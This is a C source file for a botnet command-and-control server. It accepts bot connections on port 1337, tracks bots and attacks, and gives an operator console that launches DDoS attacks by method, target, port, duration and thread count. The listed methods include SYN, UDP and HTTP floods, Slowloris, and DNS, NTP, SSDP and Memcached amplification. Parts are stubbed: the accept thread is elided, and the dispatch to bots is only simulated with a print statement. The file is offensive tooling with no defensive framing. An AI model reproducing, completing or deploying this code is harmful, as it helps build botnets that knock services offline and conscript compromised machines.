#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include "ascii_art.h"

#define CNC_PORT 1337
#define MAX_BOTS 1000
#define MAX_ATTACKS 10

typedef struct {
    char id[20];
    char ip[16];
    int port;
    time_t last_seen;
    int active;
} bot_t;

typedef struct {
    int id;
    char method[50];
    char target[256];
    int port;
    int duration;
    time_t start_time;
    int active;
} attack_t;

bot_t bots[MAX_BOTS];
attack_t attacks[MAX_ATTACKS];
int bot_count = 0;
int attack_count = 0;

void clear_screen() {
    printf("\033[2J\033[1;1H");
}

void print_menu() {
    printf("\033[1;34m");
    printf("╔════════════════════════════════════════════════════════════════╗\n");
    printf("║                         COMMAND MENU                           ║\n");
    printf("╠════════════════════════════════════════════════════════════════╣\n");
    printf("║  help                    - Show this menu                      ║\n");
    printf("║  list bots               - List connected bots                 ║\n");
    printf("║  list attacks            - Show active attacks                 ║\n");
    printf("║  attack <method> <target> <port> <time> <threads>              ║\n");
    printf("║  stop <attack_id>        - Stop specific attack                ║\n");
    printf("║  stop all                - Stop all attacks                    ║\n");
    printf("║  methods                 - Show available attack methods       ║\n");
    printf("║  clear                   - Clear screen                        ║\n");
    printf("║  exit                    - Exit C&C server                     ║\n");
    printf("╚════════════════════════════════════════════════════════════════╝\n");
    printf("\033[0m\n");
}

void print_methods() {
    printf("\033[1;36m");
    printf("┌───────────────────── AVAILABLE METHODS ───────────────────────┐\n");
    printf("│ UDP-FLOOD        - UDP flood using connected sockets          │\n");
    printf("│ UDP-RAW          - UDP flood using raw sockets                │\n");
    printf("│ TCP-SYN          - TCP SYN flood                              │\n");
    printf("│ HTTP-FLOOD       - HTTP/HTTPS request flood                   │\n");
    printf("│ SLOWLORIS        - Slowloris attack                           │\n");
    printf("│ ICMP-FLOOD       - ICMP ping flood                            │\n");
    printf("│ DNS-AMP          - DNS amplification attack                   │\n");
    printf("│ NTP-AMP          - NTP amplification attack                   │\n");
    printf("│ SSDP-AMP         - SSDP amplification attack                  │\n");
    printf("│ MEMCACHED-AMP    - Memcached amplification attack             │\n");
    printf("└────────────────────────────────────────────────────────────────┘\n");
    printf("\033[0m");
}

void print_attack_details(const char* method, const char* target, int port, int duration, int threads) {
    printf("\033[1;33m");
    printf("┌───────────────────── ATTACK DETAILS ──────────────────────────┐\n");
    printf("│ Method:    %-45s │\n", method);
    printf("│ Target:    %-45s │\n", target);
    printf("│ Port:      %-45d │\n", port);
    printf("│ Duration:  %-45d │\n", duration);
    printf("│ Threads:   %-45d │\n", threads);
    printf("│ Start:     %-45s │\n", ctime(&(time_t){time(NULL)}));
    printf("└────────────────────────────────────────────────────────────────┘\n");
    printf("\033[0m");
}

void* bot_handler(void* socket_ptr) {
    int sockfd = *(int*)socket_ptr;
    char buffer[1024];
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    
    getpeername(sockfd, (struct sockaddr*)&client_addr, &addr_len);
    
    // Add bot to list
    if(bot_count < MAX_BOTS) {
        strcpy(bots[bot_count].ip, inet_ntoa(client_addr.sin_addr));
        bots[bot_count].port = ntohs(client_addr.sin_port);
        snprintf(bots[bot_count].id, sizeof(bots[bot_count].id), "BOT-%03d", bot_count);
        bots[bot_count].last_seen = time(NULL);
        bots[bot_count].active = 1;
        bot_count++;
        
        printf("\033[1;32m[+] Bot connected: %s (%s:%d)\033[0m\n", 
               bots[bot_count-1].id, bots[bot_count-1].ip, bots[bot_count-1].port);
    }
    
    while(1) {
        int bytes = recv(sockfd, buffer, sizeof(buffer)-1, 0);
        if(bytes <= 0) break;
        
        buffer[bytes] = 0;
        printf("Bot %s: %s\n", bots[bot_count-1].id, buffer);
        
        // Handle bot responses
        if(strstr(buffer, "ATTACK_STARTED")) {
            printf("\033[1;32m[+] Attack started successfully\033[0m\n");
        }
    }
    
    close(sockfd);
    return NULL;
}

void start_attack(const char* method, const char* target, int port, int duration, int threads) {
    if(attack_count >= MAX_ATTACKS) {
        printf("Maximum number of attacks reached!\n");
        return;
    }
    
    attacks[attack_count].id = attack_count + 1;
    strcpy(attacks[attack_count].method, method);
    strcpy(attacks[attack_count].target, target);
    attacks[attack_count].port = port;
    attacks[attack_count].duration = duration;
    attacks[attack_count].start_time = time(NULL);
    attacks[attack_count].active = 1;
    
    print_attack_details(method, target, port, duration, threads);
    print_loading(2);
    
    // Simulate sending attack command to bots
    printf("\033[1;35m[*] Sending attack command to %d bots...\033[0m\n", bot_count);
    
    attack_count++;
    print_success();
}

void list_bots() {
    printf("\033[1;36m");
    printf("┌────────────────────── CONNECTED BOTS ─────────────────────────┐\n");
    if(bot_count == 0) {
        printf("│ No bots connected                                            │\n");
    } else {
        for(int i = 0; i < bot_count; i++) {
            if(bots[i].active) {
                printf("│ %-8s %-15s %-6d %-20s │\n", 
                       bots[i].id, bots[i].ip, bots[i].port, 
                       ctime(&bots[i].last_seen));
            }
        }
    }
    printf("└────────────────────────────────────────────────────────────────┘\n");
    printf("\033[0m");
}

void list_attacks() {
    printf("\033[1;33m");
    printf("┌────────────────────── ACTIVE ATTACKS ─────────────────────────┐\n");
    if(attack_count == 0) {
        printf("│ No active attacks                                            │\n");
    } else {
        for(int i = 0; i < attack_count; i++) {
            if(attacks[i].active) {
                int elapsed = time(NULL) - attacks[i].start_time;
                int remaining = attacks[i].duration - elapsed;
                printf("│ #%-2d %-12s %-20s %-4d %3d/%3ds │\n", 
                       attacks[i].id, attacks[i].method, attacks[i].target, 
                       attacks[i].port, elapsed, attacks[i].duration);
            }
        }
    }
    printf("└────────────────────────────────────────────────────────────────┘\n");
    printf("\033[0m");
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    
    clear_screen();
    print_banner();
    print_loading(3);
    
    // Create socket
    if((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }
    
    // Set socket options
    if(setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(CNC_PORT);
    
    // Bind socket
    if(bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
    
    // Listen for connections
    if(listen(server_fd, 10) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }
    
    printf("\033[1;32m[+] C&C Server started on port %d\033[0m\n", CNC_PORT);
    
    // Accept connections in separate thread
    pthread_t accept_thread;
    // ... (accept thread implementation)
    
    // Main command loop
    char command[256];
    while(1) {
        printf("\033[1;35mC&C>\033[0m ");
        fflush(stdout);
        
        if(fgets(command, sizeof(command), stdin) == NULL) break;
        
        command[strcspn(command, "\n")] = 0; // Remove newline
        
        if(strcmp(command, "help") == 0) {
            print_menu();
        }
        else if(strcmp(command, "methods") == 0) {
            print_methods();
        }
        else if(strcmp(command, "list bots") == 0) {
            list_bots();
        }
        else if(strcmp(command, "list attacks") == 0) {
            list_attacks();
        }
        else if(strcmp(command, "clear") == 0) {
            clear_screen();
            print_banner();
        }
        else if(strncmp(command, "attack ", 7) == 0) {
            char method[50], target[256];
            int port, duration, threads;
            
            if(sscanf(command, "attack %49s %255s %d %d %d", 
                      method, target, &port, &duration, &threads) == 5) {
                start_attack(method, target, port, duration, threads);
            } else {
                printf("Usage: attack <method> <target> <port> <duration> <threads>\n");
            }
        }
        else if(strcmp(command, "exit") == 0) {
            printf("Shutting down C&C server...\n");
            break;
        }
        else if(strlen(command) > 0) {
            printf("Unknown command. Type 'help' for available commands.\n");
        }
    }
    
    close(server_fd);
    return 0;
}
